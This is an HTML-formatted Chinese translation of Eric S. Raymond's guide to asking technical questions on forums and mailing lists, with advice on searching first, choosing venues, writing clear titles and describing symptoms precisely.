<p>我们意识到许多人只是想使用我们写的软件，他们对学习技术细节没有兴趣。对大多数人而言，电脑只是种工具，是种达到目的的手段而已。他们有自己的生活并且有更要紧的事要做。我们了解这点，也从不指望每个人都对这些让我们着迷的技术问题感兴趣。尽管如此，我们回答问题的风格是指向那些真正对此有兴趣并愿意主动参与解决问题的人，这一点不会变，也不该变。如果连这都变了，我们就是在降低做自己最擅长的事情上的效率。</p>
<p>我们（在很大程度上）是自愿的，从繁忙的生活中抽出时间来解答疑惑，而且时常被提问淹没。所以我们无情的滤掉一些话题，特别是拋弃那些看起来像失败者的家伙，以便更高效的利用时间来回答<code>赢家（winner）</code>的问题。</p>
<p>如果你厌恶我们的态度，高高在上，或过于傲慢，不妨也设身处地想想。我们并没有要求你向我们屈服 —— 事实上，我们大多数人非常乐意与你平等地交流，只要你付出小小努力来满足基本要求，我们就会欢迎你加入我们的文化。但让我们帮助那些不愿意帮助自己的人是没有效率的。无知没有关系，但装白痴就是不行。</p>
<p>所以，你不必在技术上很在行才能吸引我们的注意，但你必须表现出能引导你变得在行的特质 —— 机敏、有想法、善于观察、乐于主动参与解决问题。如果你做不到这些使你与众不同的事情，我们建议你花点钱找家商业公司签个技术支持服务合同，而不是要求黑客个人无偿地帮助你。</p>
<p>如果你决定向我们求助，当然你也不希望被视为失败者，更不愿成为失败者中的一员。能立刻得到快速并有效答案的最好方法，就是像赢家那样提问 —— 聪明、自信、有解决问题的思路，只是偶尔在特定的问题上需要获得一点帮助。</p>
<p>（欢迎对本指南提出改进意见。你可以 email 你的建议至 <a href="/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/esr@thyrsus.com">esr@thyrsus.com</a> 或 <a href="/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/respond-auto@linuxmafia.com">respond-auto@linuxmafia.com</a>。然而请注意，本文并非<a href="http://www.ietf.org/rfc/rfc1855.txt" target="_blank" rel="nofollow noopener">网络礼节</a>的通用指南，而我们通常会拒绝无助于在技术论坛得到有用答案的建议）。</p>

<h2 id="在提问之前"><a href="#在提问之前" class="headerlink" title="在提问之前"></a>在提问之前</h2><p>在你准备要通过电子邮件、新闻群组或者聊天室提出技术问题前，请先做到以下事情：</p>
<ol>
<li>尝试在你准备提问的论坛的旧文章中搜索答案。</li>
<li>尝试上网搜索以找到答案。</li>
<li>尝试阅读手册以找到答案。</li>
<li>尝试阅读常见问题文件（FAQ）以找到答案。</li>
<li>尝试自己检查或试验以找到答案。</li>
<li>向你身边的强者朋友打听以找到答案。</li>
<li>如果你是程序开发者，请尝试阅读源代码以找到答案。</li>
</ol>
<p>当你提出问题的时候，请先表明你已经做了上述的努力；这将有助于树立你并不是一个不劳而获且浪费别人的时间的提问者。如果你能一并表达在做了上述努力的过程中所<strong>学到</strong>的东西会更好，因为我们更乐于回答那些表现出能从答案中学习的人的问题。</p>
<p>运用某些策略，比如先用 Google 搜索你所遇到的各种错误信息（搜索 <a href="http://groups.google.com/" target="_blank" rel="nofollow noopener">Google 论坛</a>和网页），这样很可能直接就找到了能解决问题的文件或邮件列表线索。即使没有结果，在邮件列表或新闻组寻求帮助时加上一句 <code>我在 Google 中搜过下列句子但没有找到什么有用的东西</code> 也是件好事，即使它只是表明了搜索引擎不能提供哪些帮助。这么做（加上搜索过的字串）也让遇到相似问题的其他人能被搜索引擎引导到你的提问来。</p>
<p>别着急，不要指望几秒钟的 Google 搜索就能解决一个复杂的问题。在向专家求助之前，再阅读一下常见问题文件（FAQ）、放轻松、坐舒服一些，再花点时间思考一下这个问题。相信我们，他们能从你的提问看出你做了多少阅读与思考，如果你是有备而来，将更有可能得到解答。不要将所有问题一股脑拋出，只因你的第一次搜索没有找到答案（或者找到太多答案）。</p>
<p>准备好你的问题，再将问题仔细的思考过一遍，因为草率的发问只能得到草率的回答，或者根本得不到任何答案。越是能表现出在寻求帮助前你为解决问题所付出的努力，你越有可能得到实质性的帮助。</p>
<p>小心别问错了问题。如果你的问题基于错误的假设，某个普通黑客（J. Random Hacker）多半会一边在心里想着<code>蠢问题…</code>， 一边用无意义的字面解释来答复你，希望着你会从问题的回答（而非你想得到的答案）中汲取教训。</p>
<p>绝不要自以为<strong>够格</strong>得到答案，你没有；你并没有。毕竟你没有为这种服务支付任何报酬。你将会是自己去<strong>挣到</strong>一个答案，靠提出有内涵的、有趣的、有思维激励作用的问题 —— 一个有潜力能贡献社区经验的问题，而不仅仅是被动的从他人处索取知识。</p>
<p>另一方面，表明你愿意在找答案的过程中做点什么是一个非常好的开端。<code>谁能给点提示？</code>、<code>我的这个例子里缺了什么？</code>以及<code>我应该检查什么地方</code>比<code>请把我需要的确切的过程贴出来</code>更容易得到答复。因为你表现出只要有人能指个正确方向，你就有完成它的能力和决心。</p>

<h2 id="当你提问时"><a href="#当你提问时" class="headerlink" title="当你提问时"></a>当你提问时</h2><h3 id="慎选提问的论坛"><a href="#慎选提问的论坛" class="headerlink" title="慎选提问的论坛"></a>慎选提问的论坛</h3><p>小心选择你要提问的场合。如果你做了下述的事情，你很可能被忽略掉或者被看作失败者：</p>
<ul>
<li>在与主题不合的论坛上贴出你的问题。</li>
<li>在探讨进阶技术问题的论坛张贴非常初级的问题；反之亦然。</li>
<li>在太多的不同新闻群组上重复转贴同样的问题（cross-post）。</li>
<li>向既非熟人也没有义务解决你问题的人发送私人电邮。</li>
</ul>
<p>黑客会剔除掉那些搞错场合的问题，以保护他们沟通的渠道不被无关的东西淹没。你不会想让这种事发生在自己身上的。</p>
<p>因此，第一步是找到对的论坛。再说一次，Google 和其它搜索引擎还是你的朋友，用它们来找到与你遭遇到困难的软硬件问题最相关的网站。通常那儿都有常见问题（FAQ）、邮件列表及相关说明文件的链接。如果你的努力（包括<strong>阅读</strong> FAQ）都没有结果，网站上也许还有报告 Bug（Bug-reporting）的流程或链接，如果是这样，链过去看看。</p>
<p>向陌生的人或论坛发送邮件最可能是风险最大的事情。举例来说，别假设一个提供丰富内容的网页的作者会想充当你的免费顾问。不要对你的问题是否会受到欢迎做太乐观的估计 —— 如果你不确定，那就向别处发送，或者压根别发。</p>
<p>在选择论坛、新闻群组或邮件列表时，别太相信名字，先看看 FAQ 或者许可书以弄清楚你的问题是否切题。发文前先翻翻已有的话题，这样可以让你感受一下那里的文化。事实上，事先在新闻组或邮件列表的历史记录中搜索与你问题相关的关键词是个极好的主意，也许这样就找到答案了。即使没有，也能帮助你归纳出更好的问题。</p>
<p>别像机关枪似的一次"扫射"所有的帮助渠道，这就像大喊大叫一样会使人不快。要一个一个地来。</p>
<p>搞清楚你的主题！最典型的错误之一是在某种致力于跨平台可移植的语言、套件或工具的论坛中提关于 Unix 或 Windows 操作系统程序界面的问题。如果你不明白为什么这是大错，最好在搞清楚这之间差异之前什么也别问。</p>
<p>一般来说，在仔细挑选的公共论坛中提问，会比在私有论坛中提同样的问题更容易得到有用的回答。有几个理由可以支持这点，一是看潜在的回复者有多少，二是看观众有多少。黑客较愿意回答那些能帮助到许多人的问题。</p>
<p>可以理解的是，老练的黑客和一些热门软件的作者正在接受过多的错发信息。就像那根最后压垮骆驼背的稻草一样，你的加入也有可能使情况走向极端 —— 已经好几次了，一些热门软件的作者从自己软件的支持中抽身出来，因为伴随而来涌入其私人邮箱的无用邮件变得无法忍受。</p>

<h3 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h3><p>搜索，<strong>然后</strong> 在 Stack Exchange 问。</p>
<p>近年来，Stack Exchange 社区已经成为回答技术及其他问题的主要渠道，尤其是那些开放源码的项目。</p>
<p>因为 Google 索引是即时的，在看 Stack Exchange 之前先在 Google 搜索。有很高的机率某人已经问了一个类似的问题，而且 Stack Exchange 网站们往往会是搜索结果中最前面几个。如果你在 Google 上没有找到任何答案，你再到特定相关主题的网站去找。用标签（Tag）搜索能让你更缩小你的搜索结果。</p>
<p>Stack Exchange 已经成长到<a href="http://stackexchange.com/sites" target="_blank" rel="nofollow noopener">超过一百个网站</a>，以下是最常用的几个站：</p>
<ul>
<li>Super User 是问一些通用的电脑问题，如果你的问题跟代码或是写程序无关，只是一些网络连线之类的，请到这里。</li>
<li>Stack Overflow 是问写程序有关的问题。</li>
<li>Server Fault 是问服务器和网管相关的问题。</li>
</ul>

<h3 id="网站和-IRC-论坛"><a href="#网站和-IRC-论坛" class="headerlink" title="网站和 IRC 论坛"></a>网站和 IRC 论坛</h3><p>本地的使用者群组（user group），或者你所用的 Linux 发行版本也许正在宣传他们的网页论坛或 IRC 频道，并提供新手帮助（在一些非英语国家，新手论坛很可能还是邮件列表）， 这些地方是开始提问的好首选，特别是当你觉得遇到的也许只是相对简单或者很普通的问题时。有广告赞助的 IRC 频道是公开欢迎提问的地方，通常可以即时得到回应。</p>
<p>事实上，如果程序出的问题只发生在特定 Linux 发行版提供的版本（这很常见），最好先去该发行版的论坛或邮件列表中提问，再到程序本身的论坛或邮件列表提问。（否则）该项目的黑客可能仅仅回复 "用<strong>我们的</strong>版本"。</p>
<p>在任何论坛发文以前，先确认一下有没有搜索功能。如果有，就试着搜索一下问题的几个关键词，也许这会有帮助。如果在此之前你已做过通用的网页搜索（你也该这样做），还是再搜索一下论坛，搜索引擎有可能没来得及索引此论坛的全部内容。</p>
<p>通过论坛或 IRC 频道来提供使用者支持服务有增长的趋势，电子邮件则大多为项目开发者间的交流而保留。所以最好先在论坛或 IRC 中寻求与该项目相关的协助。</p>
<p>在使用 IRC 的时候，首先最好不要发布很长的问题描述，有些人称之为频道洪水。最好通过一句话的问题描述来开始聊天。</p>

<h3 id="第二步，使用项目邮件列表"><a href="#第二步，使用项目邮件列表" class="headerlink" title="第二步，使用项目邮件列表"></a>第二步，使用项目邮件列表</h3><p>当某个项目提供开发者邮件列表时，要向列表而不是其中的个别成员提问，即使你确信他能最好地回答你的问题。查一查项目的文件和首页，找到项目的邮件列表并使用它。有几个很好的理由支持我们采用这种办法：</p>
<ul>
<li>任何好到需要向个别开发者提出的问题，也将对整个项目群组有益。反之，如果你认为自己的问题对整个项目群组来说太愚蠢，也不能成为骚扰个别开发者的理由。</li>
<li>向列表提问可以分散开发者的负担，个别开发者（尤其是项目领导人）也许太忙以至于没法回答你的问题。</li>
<li>大多数邮件列表都会被存档，那些被存档的内容将被搜索引擎索引。如果你向列表提问并得到解答，将来其它人可以通过网页搜索找到你的问题和答案，也就不用再次发问了。</li>
<li>如果某些问题经常被问到，开发者可以利用此信息来改进说明文件或软件本身，以使其更清楚。如果只是私下提问，就没有人能看到最常见问题的完整场景。</li>
</ul>
<p>如果一个项目既有"使用者" 也有"开发者"（或"黑客"）邮件列表或论坛，而你又不会动到那些源代码，那么就向"使用者"列表或论坛提问。不要假设自己会在开发者列表中受到欢迎，那些人多半会将你的提问视为干扰他们开发的噪音。</p>
<p>然而，如果你<strong>确信</strong>你的问题很特别，而且在"使用者" 列表或论坛中几天都没有回复，可以试试前往"开发者"列表或论坛发问。建议你在张贴前最好先暗地里观察几天以了解那里的行事方式（事实上这是参与任何私有或半私有列表的好主意）</p>
<p>如果你找不到一个项目的邮件列表，而只能查到项目维护者的电子邮件地址，尽管向他发信。即使是在这种情况下，也别假设（项目）邮件列表不存在。在你的电子邮件中，请陈述你已经试过但没有找到合适的邮件列表，也提及你不反对将自己的邮件转发给他人（许多人认为，即使没什么秘密，私人电子邮件也不应该被公开。通过允许将你的电子邮件转发他人，你给了相应人员处置你邮件的选择）。</p>

<h3 id="使用有意义且描述明确的标题"><a href="#使用有意义且描述明确的标题" class="headerlink" title="使用有意义且描述明确的标题"></a>使用有意义且描述明确的标题</h3><p>在邮件列表、新闻群组或论坛中，大约 50 字以内的标题是抓住资深专家注意力的好机会。别用喋喋不休的<code>帮帮忙</code>、<code>跪求</code>、<code>急</code>（更别说<code>救命啊！！！！</code>这样让人反感的话，用这种标题会被条件反射式地忽略）来浪费这个机会。不要妄想用你的痛苦程度来打动我们，而应该是在这点空间中使用极简单扼要的描述方式来提出问题。</p>
<p>一个好标题范例是<code>目标 —— 差异</code>式的描述，许多技术支持组织就是这样做的。在<code>目标</code>部分指出是哪一个或哪一组东西有问题，在<code>差异</code>部分则描述与期望的行为不一致的地方。</p>
<blockquote>
<p>蠢问题：救命啊！我的笔记本电脑不能正常显示了！</p>
</blockquote>
<blockquote>
<p>聪明问题：X.org 6.8.1 的鼠标光标会变形，某牌显卡 MV1005 芯片组。</p>
</blockquote>
<blockquote>
<p>更聪明问题：X.org 6.8.1 的鼠标光标，在某牌显卡 MV1005 芯片组环境下 - 会变形。</p>
</blockquote>
<p>编写<code>目标 —— 差异</code> 式描述的过程有助于你组织对问题的细致思考。是什么被影响了？ 仅仅是鼠标光标或者还有其它图形？只在 X.org 的 X 版中出现？或只是出现在 6.8.1 版中？ 是针对某牌显卡芯片组？或者只是其中的 MV1005 型号？ 一个黑客只需瞄一眼就能够立即明白你的环境<strong>和</strong>你遇到的问题。</p>
<p>总而言之，请想像一下你正在一个只显示标题的存档讨论串（Thread）索引中查寻。让你的标题更好地反映问题，可使下一个搜索类似问题的人能够关注这个讨论串，而不用再次提问相同的问题。</p>
<p>如果你想在回复中提出问题，记得要修改内容标题，以表明你是在问一个问题， 一个看起来像 <code>Re: 测试</code> 或者 <code>Re: 新 bug</code> 的标题很难引起足够重视。另外，在不影响连贯性之下，适当引用并删减前文的内容，能给新来的读者留下线索。</p>
<p>对于讨论串，不要直接点击回复来开始一个全新的讨论串，这将限制你的观众。因为有些邮件阅读程序，比如 mutt ，允许使用者按讨论串排序并通过折叠讨论串来隐藏消息，这样做的人永远看不到你发的消息。</p>
<p>仅仅改变标题还不够。mutt 和其它一些邮件阅读程序还会检查邮件标题以外的其它信息，以便为其指定讨论串。所以宁可发一个全新的邮件。</p>
<p>在网页论坛上，好的提问方式稍有不同，因为讨论串与特定的信息紧密结合，并且通常在讨论串外就看不到里面的内容，故通过回复提问，而非改变标题是可接受的。不是所有论坛都允许在回复中出现分离的标题，而且这样做了基本上没有人会去看。不过，通过回复提问，这本身就是暧昧的做法，因为它们只会被正在查看该标题的人读到。所以，除非你<strong>只想</strong>在该讨论串当前活跃的人群中提问，不然还是另起炉灶比较好。</p>

<h3 id="使问题容易回复"><a href="#使问题容易回复" class="headerlink" title="使问题容易回复"></a>使问题容易回复</h3><p>以<code>请将你的回复发送到……</code>来结束你的问题多半会使你得不到回答。如果你觉得花几秒钟在邮件客户端设置一下回复地址都麻烦，我们也觉得花几秒钟思考你的问题更麻烦。如果你的邮件程序不支持这样做，<a href="http://linuxmafia.com/faq/Mail/muas.html" target="_blank" rel="nofollow noopener">换个好点的</a>；如果是操作系统不支持这种邮件程序，也换个好点的。</p>
<p>在论坛，要求通过电子邮件回复是非常无礼的，除非你认为回复的信息可能比较敏感（有人会为了某些未知的原因，只让你而不是整个论坛知道答案）。如果你只是想在有人回复讨论串时得到电子邮件提醒，可以要求网页论坛发送给你。几乎所有论坛都支持诸如<code>追踪此讨论串</code>、<code>有回复时发送邮件提醒</code>等功能。</p>

<h3 id="用清晰、正确、精准且语法正确的语句"><a href="#用清晰、正确、精准且语法正确的语句" class="headerlink" title="用清晰、正确、精准且语法正确的语句"></a>用清晰、正确、精准且语法正确的语句</h3><p>我们从经验中发现，粗心的提问者通常也会粗心的写程序与思考（我敢打包票）。回答粗心大意者的问题很不值得，我们宁愿把时间耗在别处。</p>
<p>正确的拼写、标点符号和大小写是很重要的。一般来说，如果你觉得这样做很麻烦，不想在乎这些，那我们也觉得麻烦，不想在乎你的提问。花点额外的精力斟酌一下字句，用不着太僵硬与正式 —— 事实上，黑客文化很看重能准确地使用非正式、俚语和幽默的语句。但它<strong>必须很</strong>准确，而且有迹象表明你是在思考和关注问题。</p>
<p>正确地拼写、使用标点和大小写，不要将<code>its</code>混淆为<code>it's</code>，<code>loose</code>搞成<code>lose</code>或者将<code>discrete</code>弄成<code>discreet</code>。不要<strong>全部用大写</strong>，这会被视为无礼的大声嚷嚷（全部小写也好不到哪去，因为不易阅读。<a href="http://en.wikipedia.org/wiki/Alan_Cox" target="_blank" rel="nofollow noopener">Alan Cox</a> 也许可以这样做，但你不行）。</p>
<p>更白话的说，如果你写得像是个半文盲[译注：<a href="http://zh.wikipedia.org/wiki/%E5%B0%8F%E7%99%BD" target="_blank" rel="nofollow noopener">小白</a>]，那多半得不到理睬。也不要使用即时通信中的简写或<a href="http://zh.wikipedia.org/wiki/%E7%81%AB%E6%98%9F%E6%96%87" target="_blank" rel="nofollow noopener">火星文</a>，如将<code>的</code>简化为<code>d</code>会使你看起来像一个为了少打几个键而省字的小白。更糟的是，如果像个小孩似地鬼画符那绝对是在找死，可以肯定没人会理你（或者最多是给你一大堆指责与挖苦）。</p>
<p>如果在使用非母语的论坛提问，你可以犯点拼写和语法上的小错，但决不能在思考上马虎（没错，我们通常能弄清两者的分别）。同时，除非你知道回复者使用的语言，否则请使用英语书写。繁忙的黑客一般会直接删除用他们看不懂语言写的消息。在网络上英语是通用语言，用英语书写可以将你的问题在尚未被阅读就被直接删除的可能性降到最低。</p>
<p>如果英文是你的外语（Second language），提示潜在回复者你有潜在的语言困难是很好的：
[译注：以下附上原文以供使用]</p>
<blockquote>
<p>English is not my native language; please excuse typing errors.</p>
</blockquote>
<ul>
<li>英文不是我的母语，请原谅我的错字或语法。</li>
</ul>
<blockquote>
<p>If you speak $LANGUAGE, please email/PM me;
I may need assistance translating my question.</p>
</blockquote>
<ul>
<li>如果你说<strong>某语言</strong>，请寄信/私讯给我；我需要有人协助我翻译我的问题。</li>
</ul>
<blockquote>
<p>I am familiar with the technical terms,
but some slang expressions and idioms are difficult for me.</p>
</blockquote>
<ul>
<li>我对技术名词很熟悉，但对于俗语或是特别用法比较不甚了解。</li>
</ul>
<blockquote>
<p>I've posted my question in $LANGUAGE and English.
I'll be glad to translate responses, if you only use one or the other.</p>
</blockquote>
<ul>
<li>我把我的问题用<strong>某语言</strong>和英文写出来，如果你只用一种语言回答，我会乐意将其翻译成另一种。</li>
</ul>

<h3 id="使用易于读取且标准的文件格式发送问题"><a href="#使用易于读取且标准的文件格式发送问题" class="headerlink" title="使用易于读取且标准的文件格式发送问题"></a>使用易于读取且标准的文件格式发送问题</h3><p>如果你人为地将问题搞得难以阅读，它多半会被忽略，人们更愿读易懂的问题，所以：</p>
<ul>
<li>使用纯文字而不是 HTML (<a href="http://archive.birdhouse.org/etc/evilmail.html" target="_blank" rel="nofollow noopener">关闭 HTML</a> 并不难）。</li>
<li>使用 MIME 附件通常是可以的，前提是真正有内容（譬如附带的源代码或 patch），而不仅仅是邮件程序生成的模板（譬如只是信件内容的拷贝）。</li>
<li>不要发送一段文字只是一行句子但自动换行后会变成多行的邮件（这使得回复部分内容非常困难）。设想你的读者是在 80 个字符宽的终端机上阅读邮件，最好设置你的换行分割点小于 80 字。</li>
<li>但是，对一些特殊的文件<strong>不要</strong>设置固定宽度（譬如日志档案拷贝或会话记录）。数据应该原样包含，让回复者有信心他们看到的是和你看到的一样的东西。</li>
<li>在英语论坛中，不要使用<code>Quoted-Printable</code> MIME 编码发送消息。这种编码对于张贴非 ASCII 语言可能是必须的，但很多邮件程序并不支持这种编码。当它们处理换行时，那些文本中四处散布的<code>=20</code>符号既难看也分散注意力，甚至有可能破坏内容的语意。</li>
<li>绝对，<strong>永远</strong>不要指望黑客们阅读使用封闭格式编写的文档，像微软公司的 Word 或 Excel 文件等。大多数黑客对此的反应就像有人将还在冒热气的猪粪倒在你家门口时你的反应一样。即便他们能够处理，他们也很厌恶这么做。</li>
<li>如果你从使用 Windows 的电脑发送电子邮件，关闭微软愚蠢的<code>智能引号</code>功能 （从[选项] &gt; [校订] &gt; [自动校正选项]，勾选掉<code>智能引号</code>单选框），以免在你的邮件中到处散布垃圾字符。</li>
<li>在论坛，勿滥用<code>表情符号</code>和<code>HTML</code>功能（当它们提供时）。一两个表情符号通常没有问题，但花哨的彩色文本倾向于使人认为你是个无能之辈。过滥地使用表情符号、色彩和字体会使你看来像个傻笑的小姑娘。这通常不是个好主意，除非你只是对性而不是对答案感兴趣。</li>
</ul>
<p>如果你使用图形用户界面的邮件程序（如微软公司的 Outlook 或者其它类似的），注意它们的默认设置不一定满足这些要求。大多数这类程序有基于选单的<code>查看源代码</code>命令，用它来检查发送文件夹中的邮件，以确保发送的是纯文本文件同时没有一些奇怪的字符。</p>

<h3 id="精确地描述问题并言之有物"><a href="#精确地描述问题并言之有物" class="headerlink" title="精确地描述问题并言之有物"></a>精确地描述问题并言之有物</h3><ul>
<li>仔细、清楚地描述你的问题或 Bug 的症状。</li>
<li>描述问题发生的环境（机器配置、操作系统、应用程序、以及相关的信息），提供经销商的发行版和版本号（如：<code>Fedora Core 4</code>、<code>Slackware 9.1</code>等）。</li>
<li>描述在提问前你是怎样去研究和理解这个问题的。</li>
<li>描述在提问前为确定问题而采取的诊断步骤。</li>
<li>描述最近做过什么可能相关的硬件或软件变更。</li>
<li>尽可能的提供一个可以<code>重现这个问题的可控环境</code>的方法。</li>
</ul>
<p>尽量去揣测一个黑客会怎样反问你，在你提问之前预先将黑客们可能遇到的问题回答一遍。</p>
<p>以上几点中，当你报告的是你认为可能在代码中的问题时，给黑客一个可以重现你的问题的环境尤其重要。当你这么做时，你得到有效的回答的机会和速度都会大大的提升。</p>
<p><a href="http://www.chiark.greenend.org.uk/~sgtatham/" target="_blank" rel="nofollow noopener">Simon Tatham</a> 写过一篇名为《<a href="http://www.chiark.greenend.org.uk/~sgtatham/bugs-cn.html" target="_blank" rel="nofollow noopener">如何有效的报告 Bug</a>》的出色文章。强力推荐你也读一读。</p>

<h3 id="话不在多而在精"><a href="#话不在多而在精" class="headerlink" title="话不在多而在精"></a>话不在多而在精</h3><p>你需要提供精确有内容的信息。这并不是要求你简单的把成堆的出错代码或者资料完全转录到你的提问中。如果你有庞大而复杂的测试样例能重现程序挂掉的情境，尽量将它剪裁得越小越好。</p>
<p>这样做的用处至少有三点。
第一，表现出你为简化问题付出了努力，这可以使你得到回答的机会增加；
第二，简化问题使你更有可能得到<strong>有用</strong>的答案；
第三，在精炼你的 bug 报告的过程中，你很可能就自己找到了解决方法或权宜之计。</p>

<h3 id="别动辄声称找到-Bug"><a href="#别动辄声称找到-Bug" class="headerlink" title="别动辄声称找到 Bug"></a>别动辄声称找到 Bug</h3><p>当你在使用软件中遇到问题，除非你非常、<strong>非常</strong>的有根据，不要动辄声称找到了 Bug。提示：除非你能提供解决问题的源代码补丁，或者提供回归测试来表明前一版本中行为不正确，否则你都多半不够完全确信。这同样适用在网页和文件，如果你（声称）发现了文件的<code>Bug</code>，你应该能提供相应位置的修正或替代文件。</p>
<p>请记得，还有许多其它使用者没遇到你发现的问题，否则你在阅读文件或搜索网页时就应该发现了（你在抱怨前<a href="#%E5%9C%A8%E6%8F%90%E9%97%AE%E4%B9%8B%E5%89%8D">已经做了这些，是吧</a>？）。这也意味着很有可能是你弄错了而不是软件本身有问题。</p>
<p>编写软件的人总是非常辛苦地使它尽可能完美。如果你声称找到了 Bug，也就是在质疑他们的能力，即使你是对的，也有可能会冒犯到其中某部分人。当你在标题中嚷嚷着有<code>Bug</code>时，这尤其严重。</p>
<p>提问时，即使你私下非常确信已经发现一个真正的 Bug，最好写得像是<strong>你</strong>做错了什么。如果真的有 Bug，你会在回复中看到这点。这样做的话，如果真有 Bug，维护者就会向你道歉，这总比你惹恼别人然后欠别人一个道歉要好一点。</p>

<h3 id="低声下气不能代替你的功课"><a href="#低声下气不能代替你的功课" class="headerlink" title="低声下气不能代替你的功课"></a>低声下气不能代替你的功课</h3><p>有些人明白他们不该粗鲁或傲慢的提问并要求得到答复，但他们选择另一个极端 —— 低声下气：<code>我知道我只是个可悲的新手，一个撸瑟，但...</code>。这既使人困扰，也没有用，尤其是伴随着与实际问题含糊不清的描述时更令人反感。</p>
<p>别用原始灵长类动物的把戏来浪费你我的时间。取而代之的是，尽可能清楚地描述背景条件和你的问题情况。这比低声下气更好地定位了你的位置。</p>
<p>有时网页论坛会设有专为新手提问的版面，如果你真的认为遇到了初学者的问题，到那去就是了，但一样别那么低声下气。</p>

<h3 id="描述问题症状而非你的猜测"><a href="#描述问题症状而非你的猜测" class="headerlink" title="描述问题症状而非你的猜测"></a>描述问题症状而非你的猜测</h3><p>告诉黑客们你认为问题是怎样造成的并没什么帮助。（如果你的推断如此有效，还用向别人求助吗？），因此要确信你原原本本告诉了他们问题的症状，而不是你的解释和理论；让黑客们来推测和诊断。如果你认为陈述自己的猜测很重要，清楚地说明这只是你的猜测，并描述为什么它们不起作用。</p>
<p><strong>蠢问题</strong></p>
<blockquote>
<p>我在编译内核时接连遇到 SIG11 错误，
我怀疑某条飞线搭在主板的走线上了，这种情况应该怎样检查最好？</p>
</blockquote>
<p><strong>聪明问题</strong></p>
<blockquote>
<p>我的组装电脑是 FIC-PA2007 主机板搭载 AMD K6/233 CPU（威盛 Apollo VP2 芯片组），
256MB Corsair PC133 SDRAM 内存，在编译内核时，从开机 20 分钟以后就频频产生 SIG11 错误，
但是在头 20 分钟内从没发生过相同的问题。重新启动也没有用，但是关机一晚上就又能工作 20 分钟。
所有内存都换过了，没有效果。相关部分的标准编译记录如下…。</p>
</blockquote>
<p>由于以上这点似乎让许多人觉得难以配合，这里有句话可以提醒你：<code>所有的诊断专家都来自密苏里州。</code> 美国国务院的官方座右铭则是：<code>让我看看</code>（出自国会议员 Willard D. Vandiver 在 1899 年时的讲话：<code>我来自一个出产玉米，棉花，牛蒡和民主党人的国家，滔滔雄辩既不能说服我，也不会让我满意。我来自密苏里州，你必须让我看看。</code>） 针对诊断者而言，这并不是一种怀疑，而只是一种真实而有用的需求，以便让他们看到的是与你看到的原始证据尽可能一致的东西，而不是你的猜测与归纳的结论。所以，大方的展示给我们看吧！</p>

<h3 id="按发生时间先后列出问题症状"><a href="#按发生时间先后列出问题症状" class="headerlink" title="按发生时间先后列出问题症状"></a>按发生时间先后列出问题症状</h3><p>问题发生前的一系列操作，往往就是对找出问题最有帮助的线索。因此，你的说明里应该包含你的操作步骤，以及机器和软件的反应，直到问题发生。在命令行处理的情况下，提供一段操作记录（例如运行脚本工具所生成的），并引用相关的若干行（如 20 行）记录会非常有帮助。</p>
<p>如果挂掉的程序有诊断选项（如 -v 的详述开关），试着选择这些能在记录中增加调试信息的选项。记住，<code>多</code>不等于<code>好</code>。试着选取适当的调试级别以便提供有用的信息而不是让读者淹没在垃圾中。</p>
<p>如果你的说明很长（如超过四个段落），在开头简述问题，接下来再按时间顺序详述会有所帮助。这样黑客们在读你的记录时就知道该注意哪些内容了。</p>

<h3 id="描述目标而不是过程"><a href="#描述目标而不是过程" class="headerlink" title="描述目标而不是过程"></a>描述目标而不是过程</h3><p>如果你想弄清楚如何做某事（而不是报告一个 Bug），在开头就描述你的目标，然后才陈述重现你所卡住的特定步骤。</p>
<p>经常寻求技术帮助的人在心中有个更高层次的目标，而他们在自以为能达到目标的特定道路上被卡住了，然后跑来问该怎么走，但没有意识到这条路本身就有问题。结果要费很大的劲才能搞定。</p>
<p><strong>蠢问题</strong></p>
<blockquote>
<p>我怎样才能从某绘图程序的颜色选择器中取得十六进制的的 RGB 值？</p>
</blockquote>
<p><strong>聪明问题</strong></p>
<blockquote>
<p>我正试着用替换一幅图片的色码（color table）成自己选定的色码，我现在知道的唯一方法是编辑每个色码区块（table slot），
但却无法从某绘图程序的颜色选择器取得十六进制的的 RGB 值。</p>
</blockquote>
<p>第二种提问法比较聪明，你可能得到像是<code>建议采用另一个更合适的工具</code>的回复。</p>

<h3 id="别要求使用私人电邮回复"><a href="#别要求使用私人电邮回复" class="headerlink" title="别要求使用私人电邮回复"></a>别要求使用私人电邮回复</h3><p>黑客们认为问题的解决过程应该公开、透明，此过程中如果更有经验的人注意到不完整或者不当之处，最初的回复才能够、也应该被纠正。同时，作为提供帮助者可以得到一些奖励，奖励就是他的能力和学识被其他同行看到。</p>
<p>当你要求私下回复时，这个过程和奖励都被中止。别这样做，让<strong>回复者</strong>来决定是否私下回答 —— 如果他真这么做了，通常是因为他认为问题编写太差或者太肤浅，以至于对其它人没有兴趣。</p>
<p>这条规则存在一条有限的例外，如果你确信提问可能会引来大量雷同的回复时，那么这个神奇的提问句会是<code>向我发电邮，我将为论坛归纳这些回复</code>。试着将邮件列表或新闻群组从洪水般的雷同回复中解救出来是非常有礼貌的 —— 但你必须信守诺言。</p>

<h3 id="清楚明确的表达你的问题以及需求"><a href="#清楚明确的表达你的问题以及需求" class="headerlink" title="清楚明确的表达你的问题以及需求"></a>清楚明确的表达你的问题以及需求</h3><p>漫无边际的提问是近乎无休无止的时间黑洞。最有可能给你有用答案的人通常也正是最忙的人（他们忙是因为要亲自完成大部分工作）。这样的人对无节制的时间黑洞相当厌恶，所以他们也倾向于厌恶那些漫无边际的提问。</p>
<p>如果你明确表述需要回答者做什么（如提供指点、发送一段代码、检查你的补丁、或是其他等等），就最有可能得到有用的答案。因为这会定出一个时间和精力的上限，便于回答者能集中精力来帮你。这么做很棒。</p>
<p>要理解专家们所处的世界，请把专业技能想像为充裕的资源，而回复的时间则是稀缺的资源。你要求他们奉献的时间越少，你越有可能从真正专业而且很忙的专家那里得到解答。</p>
<p>所以，界定一下你的问题，使专家花在辨识你的问题和回答所需要付出的时间减到最少，这技巧对你有用答案相当有帮助 —— 但这技巧通常和简化问题有所区别。因此，问<code>我想更好的理解 X，可否指点一下哪有好一点说明？</code>通常比问<code>你能解释一下 X 吗？</code>更好。如果你的代码不能运作，通常请别人看看哪里有问题，比要求别人替你改正要明智得多。</p>

